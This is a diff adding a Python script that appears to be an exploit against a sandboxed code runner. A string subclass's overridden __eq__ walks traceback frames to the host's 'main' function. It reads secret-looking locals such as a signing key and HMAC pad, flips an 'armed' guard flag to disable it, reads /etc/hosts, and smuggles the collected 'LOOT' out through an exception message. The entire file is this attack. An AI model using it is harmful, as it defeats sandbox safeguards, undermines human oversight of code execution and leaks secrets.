@@ -1,0 +1,63 @@
+import sys
+LOOT = []
+HOLD = []
+class S(str):
+    def __eq__(self, other):
+        try:
+            pass
+            e = HOLD[0]
+            tb = e.__traceback__
+            fr = tb.tb_frame
+            pass
+            chain = []
+            f = fr
+            n = 0
+            while f is not None and n < 40:
+                chain.append(f.f_code.co_name)
+                if f.f_code.co_name == "main":
+                    loc = f.f_locals
+                    LOOT.append('keys=' + ','.join(k for k in loc.keys() if any(w in k.lower() for w in ('key','pad','sign','secret','hmac','arm','hook','refuse','orig'))))
+                    LOOT.append('keytext=' + str(len(str(loc.get('key_text','')))) + ':' + str(loc.get('key_text',''))[:6])
+                    ow = loc.get("own_walk")
+                    if ow is not None:
+                        ow[0] = True
+                        LOOT.append("own_walk pinned")
+                    am = loc.get('armed')
+                    LOOT.append('armed=' + type(am).__name__ + ':' + str(am)[:20])
+                    LOOT.append('ipad=' + str(loc.get('ipad'))[:20])
+                    try:
+                        am[0] = False
+                        LOOT.append('disarmed')
+                        LOOT.append('file=' + open('/etc/hosts').read(20).replace(chr(10),' '))
+                    except BaseException as x3:
+                        LOOT.append('fileerr ' + type(x3).__name__ + ' ' + str(x3)[:60])
+                    tl = loc.get("thrown_line")
+                    if tl is not None:
+                        LOOT.append("thrown_line cell")
+                f = f.f_back
+                n += 1
+            LOOT.append('chain=' + '/'.join(chain))
+        except BaseException as x:
+            LOOT.append("err " + type(x).__name__ + ": " + str(x)[:120])
+        try:
+            HOLD[0].args = (' '.join(str(x) for x in LOOT).replace("'", '').replace('[', '').replace(']', '')[:400],)
+        except BaseException:
+            pass
+        return str.__eq__(self, other)
+    __hash__ = str.__hash__
+NS = {}
+exec(compile("def boom(hold):\n    e = ValueError('x')\n    hold.append(e)\n    raise e\n", S("<pasted code>"), "exec"), NS)
+def a():
+    try:
+        NS["boom"](HOLD)
+    finally:
+        pass
+def after():
+    # second call, after the walk: is the window still open?
+    try:
+        raise KeyError("k")
+    except KeyError as k:
+        try:
+            return k.__traceback__.tb_frame.f_code.co_name
+        except BaseException as x:
+            return "refused " + type(x).__name__
